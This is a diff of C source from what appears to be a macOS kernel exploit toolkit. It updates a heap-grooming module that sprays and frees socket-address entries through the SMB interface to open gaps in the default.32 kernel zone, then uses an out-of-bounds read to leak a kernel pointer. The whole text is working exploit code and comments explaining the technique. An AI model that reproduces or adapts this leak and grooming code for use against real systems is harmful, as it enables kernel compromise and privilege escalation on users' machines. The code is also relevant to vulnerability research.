@@ -48,19 +48,18 @@
 /// `addr` using the OOB read provided by module xpl_oob_reader_base.c, we can determine the
 /// address of an allocated socket address.
 ///
-/// This module allocates multiple socket addresses with user provided data. This would lead to
-/// multiple `struct sock_addr_entry` allocations in kext.32 zone. Then it would free some of these
-/// allocated socket address which would also release the corresponding `struct sock_addr_entry`
-/// leading to creation of gaps in kext.32 zone. Then it would use the OOB read functionality
-/// provided by xpl_oob_reader_base.c to read succeeding kext.32 zone elements. It would validate
-/// the members `addr` and `next` of the read data and verify it is a valid `struct sock_addr_entry`.
-/// If it is not valid, the process is repeated again, otherwise the value of pointer `addr` is
-/// returned to the caller
+/// This module does multiple alternating allocations of socket addresses with user provided data
+/// and placeholder data. Then it would release all the socket addresses allocated with placeholder
+/// data, which would lead to creation of gaps in default.32 zone containing `struct sock_addr_entry`.
+/// Then it would use the OOB read functionality provided by xpl_oob_reader_base.c to read
+/// succeeding default.32 zone elements. It would validate the members `addr` and `next` of the read
+/// data and verify it is a valid `struct sock_addr_entry`. If it is not valid, the process is repeated
+/// again, otherwise the value of pointer `addr` is returned to the caller
 ///
 
 
-#define NUM_PAD_ELEMENTS (xpl_PAGE_SIZE / 32)
-#define NUM_GAP_ELEMENTS (xpl_PAGE_SIZE / 32 * 2)
+#define NUM_PAD_ELEMENTS (XPL_PAGE_SIZE / 32)
+#define NUM_GAP_ELEMENTS (XPL_PAGE_SIZE / 32 * 2)
 
 #define MAX_TRIES 25
 #define MAX_SESSIONS 200
@@ -99,7 +98,7 @@ int xpl_kheap_alloc_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, u
     
     /// Address of previous tailq entry
     uintptr_t prev_entry_addr = prev - offsetof(struct sock_addr_entry, next.tqe_next);
-    /// `struct sock_addr_entry` is allocated from kext.32 zone. Address of elements from this
+    /// `struct sock_addr_entry` is allocated from default.32 zone. Address of elements from this
     /// zone must be divisible by 32
     if (prev_entry_addr % 32 != 0) {
         return ENOENT;
@@ -111,18 +110,18 @@ int xpl_kheap_alloc_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, u
         return ENOENT;
     }
     
-    /// Check for valid kext.32 zone element address
+    /// Check for valid default.32 zone element address
     if (next % 32 != 0) {
         return ENOENT;
     }
     
     /// Since the socket address will be allocated on zone with element size `z_elem_size`,
     /// the page local address of allocated_address should be divisible by z_elem_size
-    /// NOTE 1: this is not always TRUE when `z_chunk_pages` of the zone is greater than 1. But
+    /// NOTE: this is not always TRUE when `z_chunk_pages` of the zone is greater than 1. But
     /// in `KHEAP_KEXT`, the smallest zone with `z_chunk_pages > 1` is having element size
     /// 288 bytes. Since we can only allocate socket addresses with upto 255 bytes, we won't
     /// have to worry about them
-    if ((allocated_address & (xpl_PAGE_SIZE - 1)) % z_elem_size != 0) {
+    if ((allocated_address & (XPL_PAGE_SIZE - 1)) % z_elem_size != 0) {
         return ENOENT;
     }
     
@@ -170,7 +169,7 @@ int xpl_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, 
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
     xpl_allocator_prpw_t element_allocator = xpl_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);
 
-    /// Allocate alternating `struct sock_addr_entry` elements in kext.32 zone. First sock addr
+    /// Allocate alternating `struct sock_addr_entry` elements in default.32 zone. First sock addr
     /// entry will be a placeholder element and second will have the member `addr` pointing
     /// to the socket address with user provided data
     for (int gap_idx = 0; gap_idx < NUM_GAP_ELEMENTS; gap_idx++) {
@@ -181,11 +180,12 @@ int xpl_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, 
         gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
         gap_info.addr_4.sin_addr.s_addr = gap_idx;
         
-        /// Allocate a placeholder `struct sock_addr_entry` element in kext.kalloc.32 zone
+        /// Allocate a placeholder `struct sock_addr_entry` element in default.32 zone
         int error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
         xpl_assert_err(error);
         
-        /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr`
+        /// Allocate a `struct sock_addr_entry` element with given data in memory pointed
+        /// by `entry->addr`
         error = xpl_allocator_prpw_allocate(element_allocator, alloc_size, sa_family, data, data_size, data_offset);
         xpl_assert_err(error);
     }
@@ -221,7 +221,7 @@ int xpl_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, 
         params.laddr_ioc_len = ioc_len;
         params.laddr_snb_name_seglen = snb_name;
         
-        /// Allocate saddr and laddr in `kext.kalloc.32` zone and read their succeeding zone element
+        /// Allocate saddr and laddr in `default.32` zone and read their succeeding zone element
         xpl_oob_reader_base_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
         xpl_assert_cond(server_name_size, ==, snb_name + 2);
         xpl_assert_cond(local_name_size, ==, snb_name + 2);
